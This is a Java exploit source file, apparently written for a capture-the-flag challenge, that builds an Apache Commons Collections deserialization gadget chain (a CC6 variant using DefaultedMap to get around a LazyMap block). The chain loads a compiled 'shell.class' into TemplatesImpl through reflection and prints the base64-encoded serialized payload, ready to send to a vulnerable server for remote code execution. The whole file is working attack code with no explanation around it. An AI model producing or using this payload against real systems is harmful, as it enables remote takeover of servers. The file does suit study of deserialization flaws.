package com.firebasky.lvbezjava.exp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import javax.xml.transform.Templates;
import java.io.File;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class exp {
    public static void main(String[] args) throws Exception {
        byte[] bytecodes = Files.readAllBytes(new File("C:\\Users\\dell.FIREBASKY\\Desktop\\lvcbweb\\ezjavacode\\target\\classes\\com\\firebasky\\lvbezjava\\exp\\shell.class").toPath());

        TemplatesImpl obj = new TemplatesImpl();
        Tools.setFieldValue(obj, "_bytecodes",new byte[][]{bytecodes});
        Tools.setFieldValue(obj, "_name", "");
        Tools.setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{obj})
        };
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        //ha1
        //Map hashMap = new HashMap();
        //Map outerMap = DefaultedMap.decorate(hashMap, transformerChain);
        ////触发getValue
        //TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "key");
        //// 通过hashamp触发
        //HashMap evalMap = new HashMap();
        //evalMap.put(tiedMapEntry, "test");
        //outerMap.remove("key");

        //cc6
        HashMap innermap = new HashMap();
        Map outerMap = DefaultedMap.decorate(innermap, transformerChain);//绕过LazyMap
        TiedMapEntry tiedmap = new TiedMapEntry(outerMap,123);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        Field field = Class.forName("java.util.HashSet").getDeclaredField("map");
        field.setAccessible(true);
        HashMap hashset_map = (HashMap) field.get(hashset);
        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(hashset_map);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedmap);
        Field field1 =transformerChain.getClass().getDeclaredField("iTransformers");
        field1.setAccessible(true);
        field1.set(transformerChain,transformers);

        System.out.println((Tools.base64Encode(Tools.serialize(hashset))));

    }
}
